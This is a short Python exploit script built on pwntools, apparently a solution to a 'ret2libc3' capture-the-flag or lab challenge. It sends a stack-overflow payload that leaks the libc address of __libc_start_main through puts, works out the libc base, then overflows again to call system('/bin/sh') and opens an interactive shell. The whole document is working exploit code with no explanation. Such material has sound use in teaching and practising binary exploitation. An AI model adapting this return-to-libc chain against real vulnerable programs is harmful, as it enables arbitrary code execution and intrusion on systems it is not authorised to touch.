from pwn import *
#目标文件
TARGET ='./ret2libc3'
elf_ret2shellcode = ELF('./ret2libc3')
elf_libc = ELF('/lib/i386-linux-gnu/libc.so.6')
sh = process(TARGET)
puts_plt = elf_ret2shellcode.plt['puts']
libc_start_main_got = elf_ret2shellcode.got['__libc_start_main']
start_addr = elf_ret2shellcode.symbols['_start']
offset =112
payload1 = 112*b'A'+ p32(puts_plt)+ p32(start_addr)+ p32(libc_start_main_got)
sh.sendline(payload1)
data= sh.recvuntil(b'Can you find it !?')
libc_start_main_addr = u32(sh.recv()[0:4])
print('libc start main addr :'+ hex(libc_start_main_addr))
libc_base = libc_start_main_addr - elf_libc.symbols['__libc_start_main']
print('libc base :'+ hex(libc_base))

system_offset= elf_libc.symbols['system']
system_addr=libc_base+system_offset
sh_addr=libc_base+next(elf_libc.search(b'/bin/sh'))
payload2=112*b"B"+p32(system_addr)+p32(sh_addr)+p32(sh_addr)
sh.sendline(payload2)
# 交互模式(查看输出)
sh.interactive()
